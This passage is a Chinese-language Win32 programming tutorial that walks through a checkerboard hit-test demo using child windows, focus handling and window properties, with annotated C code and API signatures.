<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KEYDOWN:<span class="comment">//虚拟键按下</span></span><br><span class="line">    GetCursorPos(&amp;point);<span class="comment">//获取当前鼠标位置</span></span><br><span class="line">    ScreenToClient(hWnd, &amp;point);<span class="comment">//转换屏幕坐标为客户区坐标</span></span><br><span class="line">    x = max(<span class="number">0</span>, min(DIVISIONS - <span class="number">1</span>, point.x / cxBlock));<span class="comment">//计算当前光标所在行</span></span><br><span class="line">    y = max(<span class="number">0</span>, min(DIVISIONS - <span class="number">1</span>, point.y / cyBlock));<span class="comment">//计算当前光标所在列</span></span><br><span class="line">    <span class="keyword">switch</span> (wParam) &#123;</span><br><span class="line">    <span class="keyword">case</span> VK_UP:<span class="comment">//方向键上键</span></span><br><span class="line">        --y;<span class="comment">//y的单位是列,上键按下之后纵坐标应该上移一个格子的高度</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VK_DOWN:</span><br><span class="line">        ++y;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VK_LEFT:</span><br><span class="line">        --x;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VK_HOME:<span class="comment">//Home键,光标回到左上角</span></span><br><span class="line">        x = y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VK_RIGHT:</span><br><span class="line">        ++x;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VK_END:</span><br><span class="line">        x = y = DIVISIONS - <span class="number">1</span>;<span class="comment">//End键,光标跳到右下格</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VK_RETURN:<span class="comment">//回车和空格的作用相同,都相当于在当前格的左上角按下鼠标左键</span></span><br><span class="line">    <span class="keyword">case</span> VK_SPACE:</span><br><span class="line">        SendMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, MAKELONG(x * cxBlock, y * cyBlock));<span class="comment">//通知</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    x = (x + DIVISIONS) % DIVISIONS;<span class="comment">//计算当前指向方格</span></span><br><span class="line">    y = (y + DIVISIONS) % DIVISIONS;</span><br><span class="line">    point.x = x * cxBlock + cxBlock / <span class="number">2</span>;<span class="comment">//光标放在这个格的正中间位置</span></span><br><span class="line">    point.y = y * cyBlock + cyBlock / <span class="number">2</span>;</span><br><span class="line">    ClientToScreen(hWnd, &amp;point);<span class="comment">//转换坐标</span></span><br><span class="line">    SetCursorPos(point.x, point.y);<span class="comment">//设置新光标位置</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h2 id="使用子窗口">使用子窗口</h2>
<p>每个子窗口都有自己的句柄,客户区,窗口过程函数.</p>
<p>多个子窗口将整个客户区划分成几个小的矩形区域</p>
<p>对于子窗口的鼠标消息,lParam参数包含相对于该子窗口左上角的坐标</p>
<p>本来我们的程序中使用了一个<code>fState[DIVISIONS][DIVISIONS]</code>二维数组保存每个区块的状态,整个程序就一个窗口过程,它遍历打印每个窗口的状态.</p>
<p>现在使用子窗口,使得每个区块成为一个子窗口,每个子窗口自己处理发生在自己身上的鼠标键盘动作</p>
<h3 id="注册父窗口类">注册父窗口类</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> TCHAR szAppName[] = TEXT(<span class="string">&quot;Checker4&quot;</span>);<span class="comment">//将要作为父窗口类名</span></span><br><span class="line">HWND hwnd;</span><br><span class="line">MSG msg;</span><br><span class="line">WNDCLASS wndclass;</span><br><span class="line"></span><br><span class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;<span class="comment">//填写父窗口类信息</span></span><br><span class="line">wndclass.lpfnWndProc = WndProc;</span><br><span class="line">wndclass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">wndclass.hInstance = hInstance;</span><br><span class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>,</span><br><span class="line">	IDI_APPLICATION);</span><br><span class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>,</span><br><span class="line">	IDC_ARROW);</span><br><span class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</span><br><span class="line">wndclass.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.lpszClassName = szAppName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))<span class="comment">//注册父窗口类</span></span><br><span class="line">&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;Program requires Windows NT!&quot;</span>),</span><br><span class="line">		szAppName,</span><br><span class="line">		MB_ICONERROR);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="注册子窗口类">注册子窗口类</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wndclass.lpfnWndProc = ChildWndProc;<span class="comment">//修改一下wndclass的部分信息,填写子窗口类信息</span></span><br><span class="line">wndclass.cbWndExtra = <span class="keyword">sizeof</span>(<span class="type">long</span>);</span><br><span class="line">wndclass.hIcon = <span class="literal">NULL</span>;</span><br><span class="line">wndclass.lpszClassName = szChildClass;<span class="comment">//此处绑定了szChildClass字符串作为子窗口类的索引值</span></span><br><span class="line"></span><br><span class="line">RegisterClass(&amp;wndclass);<span class="comment">//注册子窗口类</span></span><br></pre></td></tr></table></figure>
<p>此处注册子窗口类,但是并不在winmain函数中创建实例,而是当父窗口起来之后,在其WM_CREATE消息处理中创建25个szChildClass指向的子窗口实例</p>
<h3
id="创建父窗口实例显示父窗口消息循环">创建父窗口实例,显示父窗口消息循环</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hwnd = CreateWindow(szAppName, TEXT(<span class="string">&quot;Checker4 Mouse Hit-Test Demo&quot;</span>),</span><br><span class="line">	WS_OVERLAPPEDWINDOW,</span><br><span class="line">	CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">	CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">	<span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">	TranslateMessage(&amp;msg);</span><br><span class="line">	DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> msg.wParam;</span><br></pre></td></tr></table></figure>
<h3 id="父窗口过程wndproc">父窗口过程WndProc</h3>
<h4 id="变量定义-3">变量定义</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> HWND hwndChild[DIVISIONS][DIVISIONS];<span class="comment">//子窗口句柄数组,hwndChild[x][y]为第x行第y列子窗口的句柄</span></span><br><span class="line"><span class="type">int</span> cxBlock, cyBlock, x, y;<span class="comment">//cxBlock每个子窗口的尺寸,x遍历子窗口数组使用的下标</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>区分HWND句柄和HINSTANCE句柄</p>
<p>整个win32程序只有一个引用程序句柄HINSTANCE,</p>
<p>着一个程序可以有很多个窗口,每个窗口都有一个独一无二的窗口句柄HWND</p>
</blockquote>
<h4 id="窗口创建消息">窗口创建消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CREATE:<span class="comment">//主窗口创建消息,此时为创建子窗口的最佳时机</span></span><br><span class="line">	<span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; DIVISIONS; x++)<span class="comment">//遍历创建每一个子窗口</span></span><br><span class="line">		<span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; DIVISIONS; y++)</span><br><span class="line">			hwndChild[x][y] = </span><br><span class="line">			CreateWindow(</span><br><span class="line">				szChildClass, <span class="comment">//子窗口名</span></span><br><span class="line">				<span class="literal">NULL</span>,<span class="comment">//子窗口标题为空</span></span><br><span class="line">				WS_CHILDWINDOW | WS_VISIBLE,<span class="comment">//子窗口风格</span></span><br><span class="line">				<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="comment">//子窗口坐标(相对于父窗口客户区左上角),初始位置</span></span><br><span class="line">				hwnd, <span class="comment">//父窗口句柄</span></span><br><span class="line">				(HMENU)(y &lt;&lt; <span class="number">8</span> | x),<span class="comment">//子窗口的菜单句柄,作用是给父窗口提供索引,在GetDlgItem 获取子窗口句柄时有重要作用</span></span><br><span class="line">				(HINSTANCE) GetWindowLong(hwnd, GWL_HINSTANCE),<span class="comment">//从windows那里获取一个应用此程序实例句柄</span></span><br><span class="line">				<span class="literal">NULL</span><span class="comment">//通过WM_CREATE的lParam参数传递给子窗口的值的指针</span></span><br><span class="line">			);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h5 id="createwindow">CreateWindow</h5>
<p>创建父窗口实例时也使用了该函数,返回值是一个窗口实例的句柄</p>
<blockquote>
<p>创建并显示窗口三个过程:</p>
<p>RegisterClass注册窗口类,该窗口类的类名作为句柄</p>
<p>CreateWindow创建窗口实例,可以使用刚才的窗口类名填充窗口的基本信息</p>
<p>ShowWindow显示窗口类</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HWND <span class="title function_">CreateWindowA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional]  lpClassName,<span class="comment">//子窗口使用的类名</span></span></span><br><span class="line"><span class="params">  [in, optional]  lpWindowName,<span class="comment">//子窗口名</span></span></span><br><span class="line"><span class="params">  [in]            dwStyle,<span class="comment">//子窗口风格</span></span></span><br><span class="line"><span class="params">  [in]            x,<span class="comment">//子窗口位置(相对于父窗口的客户区)</span></span></span><br><span class="line"><span class="params">  [in]            y,</span></span><br><span class="line"><span class="params">  [in]            nWidth,<span class="comment">//子窗口的尺寸</span></span></span><br><span class="line"><span class="params">  [in]            nHeight,</span></span><br><span class="line"><span class="params">  [in, optional]  hWndParent,<span class="comment">//父窗口的句柄</span></span></span><br><span class="line"><span class="params">  [in, optional]  hMenu,<span class="comment">//子窗口标识符</span></span></span><br><span class="line"><span class="params">  [in, optional]  hInstance,<span class="comment">//程序实例的句柄</span></span></span><br><span class="line"><span class="params">  [in, optional]  lpParam<span class="comment">//父窗口要传递给子窗口WM_CREATE消息,lParam参数的信息</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<h4 id="调整尺寸消息">调整尺寸消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">	cxBlock = LOWORD(lParam) / DIVISIONS;<span class="comment">//重新计算区块大小</span></span><br><span class="line">	cyBlock = HIWORD(lParam) / DIVISIONS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; DIVISIONS; x++)</span><br><span class="line">		<span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; DIVISIONS; y++)</span><br><span class="line">			MoveWindow(hwndChild[x][y],<span class="comment">//调整子窗口的位置和大小</span></span><br><span class="line">				x * cxBlock, y * cyBlock,</span><br><span class="line">				cxBlock, cyBlock, TRUE);<span class="comment">//大小是cxBlock宽,cyBlock高</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="movewindow">MoveWindow</h5>
<p>对于子窗口来说,该函数中指定的坐标都是相对于父窗口客户区左上角的</p>
<p>对于非子窗口来说,该函数中的坐标是屏幕坐标</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">MoveWindow</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND hWnd,<span class="comment">//需要移动位置的窗口句柄,一般用于父窗口过程移动子窗口</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  X,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  Y,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nWidth,<span class="comment">//移动顺便设置尺寸</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nHeight,</span></span><br><span class="line"><span class="params">  [in] BOOL bRepaint<span class="comment">//是否重绘,TRUE则hWnd指向的窗口收到WM_PAINT消息</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<h4 id="左键按下消息">左键按下消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">	MessageBeep(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>理论上25个子窗口尽量铺满父窗口的客户区,但是父窗口客户区的最右边和最下边可能有留白,因此当鼠标点击到这些地方的时候父窗口就会接到WM_LBUTTONDOWN消息</p>
<p>父窗口对这种消息的处理是发出一条蜂鸣声实际上是一个wav波形文件,还有一些系统定义好了的蜂鸣声,作用不大不展开了</p>
<h4 id="获得焦点消息">获得焦点消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SETFOCUS:<span class="comment">//父窗口获取焦点之后通知它上次获得焦点的子窗口继续获得焦点</span></span><br><span class="line">	SetFocus(GetDlgItem(hwnd, idFocus));<span class="comment">//通知哪一个子窗口获得焦点,全局变量idFocus在WM_KEYDOWN被设置</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>父窗口获得焦点之后,应该把最后一次获得焦点的子窗口作为焦点窗口</p>
<p>但是处理本消息时并没有体现获得idFocus,原因是该全局变量idFocus在WM_KEYDOWN中更新,显然没有按下键盘,通过鼠标点选也可以获得焦点,获得焦点的时候就需要指定让子窗口获得焦点</p>
<p>而现在父窗口掌握着25个子窗口句柄,应该怎么把焦点交给其中之一的子窗口呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HWND <span class="title function_">GetDlgItem</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] HWND hDlg,<span class="comment">//父窗口句柄</span></span></span><br><span class="line"><span class="params">  [in]           <span class="type">int</span>  nIDDlgItem<span class="comment">//子窗口的索引值</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>这个函数的作用是,返回父窗口的一个子窗口的句柄</p>
<p>这里nIDDlgItem这个值是父窗口注册子窗口是在CreateWindow函数的hMenu上指定的,其中第x行第y列的子窗口是这样索引的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(HMENU)(y &lt;&lt; <span class="number">8</span> | x)</span><br></pre></td></tr></table></figure>
<p>既然要获取子窗口的句柄,父窗口不是实例化子窗口时就维护了一个子窗口句柄数组吗?</p>
<p>为啥还要额外维护一个值托管这个句柄呢?</p>
<p>只有一个子窗口句柄数组不能知道最近获得焦点的子窗口是谁,因此idFocus就起到了一个寄存器的作用</p>
<h4 id="虚拟键消息">虚拟键消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">	x = idFocus &amp; <span class="number">0xFF</span>;<span class="comment">//x保存原来的焦点位置(子窗口下标)</span></span><br><span class="line">	y = idFocus &gt;&gt; <span class="number">8</span>;<span class="comment">//y保存原来的焦点位置</span></span><br><span class="line">	<span class="keyword">switch</span> (wParam)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> VK_UP: </span><br><span class="line">		y--;<span class="comment">//焦点上移</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_DOWN: </span><br><span class="line">		y++;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_LEFT: </span><br><span class="line">		x--;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_RIGHT: </span><br><span class="line">		x++; </span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_HOME: </span><br><span class="line">		x = y = <span class="number">0</span>; </span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> VK_END: </span><br><span class="line">		x = y = DIVISIONS - <span class="number">1</span>; </span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">       x = (x + DIVISIONS) % DIVISIONS;</span><br><span class="line">	y = (y + DIVISIONS) % DIVISIONS;</span><br><span class="line">	idFocus = y &lt;&lt; <span class="number">8</span> | x;<span class="comment">//调整新焦点</span></span><br><span class="line">	SetFocus(GetDlgItem(hwnd, idFocus));<span class="comment">//设置新焦点</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>这里计算x,y坐标的方式根HMENU参数的定义方式相反,互为逆运算</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">		x = idFocus &amp; <span class="number">0xFF</span>;<span class="comment">//x保存原来的焦点位置</span></span><br><span class="line">		y = idFocus &gt;&gt; <span class="number">8</span>;<span class="comment">//y保存原来的焦点位置</span></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    	idFocus = y &lt;&lt; <span class="number">8</span> | x;<span class="comment">//调整新焦点</span></span><br></pre></td></tr></table></figure>
<p><code>WM_KEYDOWN</code>消息执行完毕后立刻设置当前子窗口为焦点窗口</p>
<h4 id="窗口销毁消息-1">窗口销毁消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">	PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="子窗口过程childwndproc">子窗口过程ChildWndProc</h3>
<h4 id="子窗口创建消息">子窗口创建消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">	SetWindowLong(hwnd, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// on/off flag ,刚创建时本窗口的开关状态置0</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>修改窗口的一个属性</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LONG <span class="title function_">SetWindowLongA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND hWnd,<span class="comment">//窗口句柄</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nIndex,<span class="comment">//指定要修改的窗口属性</span></span></span><br><span class="line"><span class="params">  [in] LONG dwNewLong<span class="comment">//该窗口属性的新值</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>例子中修改的是下标为0的属性,对应的宏定义是DWL_MSGRESULT(0)</p>
<p>设置对话框过程的返回值,设置成了0.</p>
<p>实际上子窗口也不需要把这个值返回给父窗口看,它自己就可以决定把自己绘制成什么颜色</p>
<p>因此只是借用了一个线程的窗口属性来放置自己应该是按下还是起来的状态</p>
<h4 id="子窗口键鼠消息">子窗口键鼠消息</h4>
<p>由于父窗口中会主动将焦点下放到子窗口,因此焦点子窗口可获取键鼠的输入.</p>
<p>父窗口只能等子窗口吃完了然后吃剩下的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">	<span class="comment">// Send most key presses to the parent window </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (wParam != VK_RETURN &amp;&amp; wParam != VK_SPACE)<span class="comment">//子窗口只负责拦截并处理空格回车消息,其他键盘消息丢给父窗口</span></span><br><span class="line">	&#123;</span><br><span class="line">		SendMessage(GetParent(hwnd), message, wParam, lParam);<span class="comment">//其他键盘消息传递给父窗口</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// For Return and Space, fall through to toggle the square</span></span><br><span class="line">	<span class="comment">//如果是空格和回车则相当于鼠标左键按下,一起处理</span></span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:<span class="comment">//左键单击按下</span></span><br><span class="line">	SetWindowLong(hwnd, <span class="number">0</span>, <span class="number">1</span> ^ GetWindowLong(hwnd, <span class="number">0</span>));<span class="comment">//子窗口开关状态置反</span></span><br><span class="line">	SetFocus(hwnd);<span class="comment">//本子窗口获取焦点</span></span><br><span class="line">	InvalidateRect(hwnd, <span class="literal">NULL</span>, FALSE);<span class="comment">//立刻重绘</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// For focus messages, invalidate the window for repaint </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里子窗口就处理里两个虚拟键消息,空格和回车,其他的消息通过</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SendMessage</span>(<span class="built_in">GetParent</span>(hwnd), message, wParam, lParam);</span><br></pre></td></tr></table></figure>
<p>转发给父窗口</p>
<p>空格,回车,左键单击一视同仁,首先本子窗口的属性置反</p>
<p>然后设置本窗口为焦点窗口</p>
<p>然后使窗口无效,导致重绘</p>
<h4 id="子窗口获取失去焦点消息">子窗口获取/失去焦点消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SETFOCUS:</span><br><span class="line">	idFocus = GetWindowLong(hwnd, GWL_ID);</span><br><span class="line">	<span class="comment">// Fall through </span></span><br><span class="line"><span class="keyword">case</span> WM_KILLFOCUS:</span><br><span class="line">	InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);<span class="comment">//失效重绘,因为子窗口获得焦点的时候会有绘制方框提示,因此失去焦点时应当不再提示</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="getwindowlong-获取窗口属性">GetWindowLong 获取窗口属性</h5>
<p>由于窗口属性都是LONG类型的值,因此该函数取名"GetWindowLong"</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LONG <span class="title function_">GetWindowLongA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND hWnd,<span class="comment">//指定要获取信息的窗口句柄</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nIndex<span class="comment">//指定要获取该窗口的哪个属性</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<table>
<colgroup>
<col style="width: 25%" />
<col style="width: 75%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><strong>GWL_EXSTYLE</strong>-20</td>
<td
style="text-align: left;">获取窗口实例的拓展风格,即CreateWindow函数指定的dwExStyle</td>
</tr>
<tr>
<td style="text-align: left;"><strong>GWL_HINSTANCE</strong>-6</td>
<td style="text-align: left;">获取应用程序句柄</td>
</tr>
<tr>
<td style="text-align: left;"><strong>GWL_HWNDPARENT</strong>-8</td>
<td style="text-align: left;">获取父窗口句柄</td>
</tr>
<tr>
<td style="text-align: left;"><strong>GWL_ID</strong>-12</td>
<td
style="text-align: left;">获取本窗口的索引值,即CreateWindow函数指定的HMENU值</td>
</tr>
<tr>
<td style="text-align: left;"><strong>GWL_STYLE</strong>-16</td>
<td
style="text-align: left;">获取窗口实例的风格,这个风格就是CreateWindow指定的dwStyle</td>
</tr>
<tr>
<td style="text-align: left;"><strong>GWL_USERDATA</strong>-21</td>
<td style="text-align: left;">Retrieves the user data associated with
the window. This data is intended for use by the application that
